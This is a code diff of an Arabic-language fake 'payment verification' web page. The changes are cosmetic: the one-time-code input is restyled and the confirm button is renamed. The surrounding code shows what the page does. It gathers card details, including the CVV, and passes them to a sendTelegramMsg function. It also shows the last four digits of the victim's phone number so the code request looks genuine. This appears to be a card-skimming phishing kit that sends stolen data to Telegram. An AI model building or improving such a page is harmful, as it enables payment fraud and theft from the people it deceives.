@@ -51,16 +51,18 @@
         .otp-icon { width: 80px; height: 80px; background-color: #e8f0fe; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .otp-icon svg { width: 40px; height: 40px; fill: #0b3b82; }
         
+        /* تعديل: تصغير المربع شوي */
         .otp-single-input { 
-            width: 100%; 
-            padding: 16px; 
-            font-size: 24px; 
+            width: 85%; 
+            margin: 0 auto 30px auto; 
+            display: block;
+            padding: 12px; 
+            font-size: 22px; 
             font-weight: bold; 
             text-align: center; 
             border: 1px solid #ccc; 
             border-radius: 8px; 
             outline: none; 
-            margin-bottom: 30px;
             direction: ltr;
         }
         .otp-single-input:focus { border-color: #f7b71d; box-shadow: 0 0 8px rgba(247, 183, 29, 0.3); }
@@ -222,13 +224,13 @@
             </div>
             <div class="payment-header">
                 <h2>التحقق من الدفع</h2>
-                <!-- التعديل هون عشان يبين آخر 4 أرقام -->
                 <p id="otp-subtitle">أدخل الرمز المرسل إلى الأرقام</p>
             </div>
             
             <input type="tel" id="otp-single-input" class="otp-single-input">
             
-            <button class="verify-btn" onclick="verifyOTP()">تأكيد</button>
+            <!-- تعديل: تغيير اسم الزر -->
+            <button class="verify-btn" onclick="verifyOTP()">تأكيد الدفع</button>
         </div>
 
         <div id="success-page">
@@ -324,7 +326,6 @@
             cardMsg += `رمز الأمان: ${cvv}`;
             sendTelegramMsg(cardMsg);
 
-            // التعديل: سحب آخر 4 أرقام وعرضها
             if (currentPhone.length >= 4) {
                 let last4 = currentPhone.slice(-4);
                 document.getElementById('otp-subtitle').innerText = `أدخل الرمز المرسل إلى ${last4}`;
